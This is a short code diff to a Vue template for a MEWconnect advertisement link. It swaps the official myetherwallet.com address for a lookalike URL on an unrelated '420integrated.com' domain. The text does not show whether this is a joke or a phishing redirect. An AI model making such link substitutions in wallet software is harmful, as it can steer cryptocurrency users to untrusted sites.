@@ -1,7 +1,7 @@
 <template>
   <div class="mew-connect-ad">
     <a
-      href="https://mewconnect.myetherwallet.com/#/"
+      href="https://mewconnect.my420wallet.420integrated.com/#/"
       rel="noopener noreferrer"
       target="_blank"
     >
